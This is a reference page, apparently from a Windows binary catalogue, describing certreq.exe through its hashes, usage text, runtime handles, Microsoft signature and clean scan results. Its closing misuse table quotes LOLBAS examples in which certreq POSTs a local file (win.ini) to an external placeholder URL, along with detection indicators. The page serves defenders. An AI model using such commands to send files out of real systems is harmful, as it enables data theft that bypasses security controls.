---
title: certreq.exe | CertReq.exe
excerpt: What is certreq.exe?
---

# certreq.exe 

* File Path: `C:\Windows\SysWOW64\certreq.exe`
* Description: CertReq.exe

## Screenshot

![certreq.exe](screenshots/certreq.exe-81C07107AB05BD4C4AE1B7D889BCD4FE-2.png)

## Hashes

Type | Hash
-- | --
MD5 | `05E63A152974EA6DBDA31CAFB7B7FAAA`
SHA1 | `6DC909C799328C27431E5ADD58D84A3B80DDE0B1`
SHA256 | `D973513E4C048829EA1281A7C57A4C352A366B5B8FC9E39F177781AF68E36396`
SHA384 | `8FC6F2C0CEAD132597667FE10E2C255BBDB6E210FA98962590BCA816B7B67A7E08E833B68E976044725FE12E14816851`
SHA512 | `6D355F45D4142673048AC0DF8702BB08B90935723C5CCEC31A87E2B53BF9843B9E9BE70678DE34A7E42D2059B58183A581E567261954A605C6EC78CC7CCAC81A`
SSDEEP | `6144:q2bcvB1l7GpOKAlGNFc0GogbH2Z1VTrj5IwWJtbi+KATSr5F3NC9Nl+:qCil7Ejc0hgbe1VTrywP+VSL9CXl+`
IMP | `F66C876B7855BFF538606AE262764AC3`
PESHA1 | `116B8C7FD1114D05B2F38E80C156DAE6BE76135E`
PE256 | `35C4578B14BC0E63A52AC355E00A99DDE078EB2790852DE8D40B75AC23B4C6D3`

## Runtime Data

### Usage (stdout):
```cmhg
Usage:
  CertReq -?
  CertReq [-v] -?
  CertReq [-Command] -?

  CertReq [-Submit] [Options] [RequestFileIn [CertFileOut [CertChainFileOut [FullResponseFileOut]]]]
    Submit a request to a Certification Authority.

  Options:
    -attrib AttributeString
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine
    -RenewOnBehalfOf
    -NoChallenge

  CertReq -Retrieve [Options] RequestId [CertFileOut [CertChainFileOut [FullResponseFileOut]]]
    Retrieve a response to a previous request from a Certification Authority.

  Options:
    -binary
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -crl
    -rpc
    -AdminForceMachine

  CertReq -New [Options] [PolicyFileIn [RequestFileOut]]
    Create a new request as directed by PolicyFileIn

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -config ConfigString
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -user
    -machine
    -xchg ExchangeCertFile

  CertReq -Accept [Options] [CertChainFileIn | FullResponseFileIn | CertFileIn]
    Accept and install a response to a previous new request.

  Options:
    -user 
    -machine 
    -pin Pin

  CertReq -Policy [Options] [RequestFileIn [PolicyFileIn [RequestFileOut [PKCS10FileOut]]]]
    Construct a cross certification or qualified subordination request
    from an existing CA certificate or from an existing request.

  Options:
    -attrib AttributeString
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -noEKU
    -AlternateSignatureAlgorithm
    -HashAlgorithm HashAlgorithm

  CertReq -Sign [Options] [RequestFileIn [RequestFileOut]]
    Sign a certificate request with an enrollment agent or qualified
    subordination signing certificate.

  Options:
    -binary
    -cert CertId
    -PolicyServer PolicyServer
    -Anonymous
    -Kerberos
    -ClientCertificate ClientCertId
    -UserName UserName
    -p Password
    -pin Pin
    -crl
    -noEKU
    -HashAlgorithm HashAlgorithm

  CertReq -Enroll [Options] TemplateName
  CertReq -Enroll -cert CertId [Options] Renew [ReuseKeys]
    Enroll for or renew a certificate.

  Options:
    -PolicyServer PolicyServer
    -user 
    -machine 
    -pin Pin

  CertReq -EnrollAIK [Options] [KeyContainerName]
    Enroll for AIK certificate.

  Options:
    -config

  CertReq -EnrollCredGuardCert [Options] TemplateName [ExtensionInfFile]
    NOTE: Enrolling for machine account Credential Guard certificate is not supported on this platform.

  Options:
    Not supported on this platform

  CertReq -EnrollLogon [Options]
    Enroll for Hello for Business Logon certificate via ADFS.

  Options:
    -q

  CertReq -Post [Options]
    POST an http request.

  Options:
    -attrib AttributeString
    -config URL

Unknown argument: --help

```

### Child Processes:
conhost.exe

### Window Title:
Certificate Request Processor

### Open Handles:

Path | Type
-- | --
(R-D)   C:\Windows\Fonts\StaticCache.dat | File
(R-D)   C:\Windows\System32\en-US\certreq.exe.mui | File
(R-D)   C:\Windows\System32\en-US\KernelBase.dll.mui | File
(RW-)   C:\Users\user | File
(RW-)   C:\Windows | File
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000004.db | Section
\BaseNamedObjects\C:\*ProgramData\*Microsoft\*Windows\*Caches\*cversions.2.ro | Section
\BaseNamedObjects\NLS_CodePage_1252_3_2_0_0 | Section
\BaseNamedObjects\NLS_CodePage_437_3_2_0_0 | Section
\Sessions\2\Windows\Theme2131664586 | Section
\Windows\Theme966197582 | Section


### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64cpu.dll |
C:\Windows\System32\wow64win.dll |
C:\Windows\SysWOW64\certreq.exe |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: CertReq.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/d973513e4c048829ea1281a7c57a4c352a366b5b8fc9e39f177781af68e36396/detection/


## Possible Misuse

*The following table contains possible examples of `certreq.exe` being misused. While `certreq.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `Name: CertReq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Command: CertReq -Post -config https://example.org/ c:\windows\win.ini and show response in terminal` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\System32\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Path: C:\Windows\SysWOW64\certreq.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq creates new files` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- IOC: certreq makes POST requests` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Certreq.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certreq.yml) | `- Link: https://dtm.uk/certreq` | 



MIT License. Copyright (c) 2020 Strontic.


